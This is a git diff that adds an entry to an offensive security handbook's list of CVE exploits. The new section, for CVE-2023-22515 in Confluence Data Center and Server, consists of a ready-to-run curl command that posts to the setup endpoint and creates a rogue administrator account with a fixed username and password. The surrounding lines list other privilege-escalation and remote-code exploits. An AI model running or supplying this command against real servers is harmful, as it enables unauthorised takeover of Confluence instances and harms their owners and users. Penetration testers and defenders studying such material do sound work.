@@ -23,6 +23,7 @@
 - [CVE-2023-0126: SonicWall SMA1000 Pre-Authentication Path Traversal Vulnerability](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-0126-SonicWall-SMA1000-Pre-Authentication-Path-Traversal-Vulnerability)
 - [CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-21716-Microsoft-Word-RTF-Font-Table-Heap-Corruption-RCE-PoC-Python-Implementation)
 - [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-21746-Windows-NTLM-EoP-LocalPotato-LPE)
+- [CVE-2023-22515: Broken Access Control Vulnerability in Confluence Data Center and Server (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-22515-Broken-Access-Control-Vulnerability-in-Confluence-Data-Center-and-Server-0-day)
 - [CVE-2023-22809: Sudo Bypass LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-22809-Sudo-Bypass-LPE)
 - [CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-23397-Microsoft-Outlook-Click-to-Run-LPE-0-day-PowerShell-Implementation)
 - [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-32629-CVE-2023-2640-GameOverlay-Ubuntu-Kernel-Exploit-LPE-0-day)
@@ -977,6 +978,12 @@ At least trigger `StorSvc` via `RpcClient.exe`.
 
 ```c
 C:\> RpcClient.exe
+```
+
+## CVE-2023-22515: Broken Access Control Vulnerability in Confluence Data Center and Server (0-day)
+
+```c
+$ curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://<RHOST>/setup/setupadministrator.action
 ```
 
 ## CVE-2023-22809: Sudo Bypass LPE
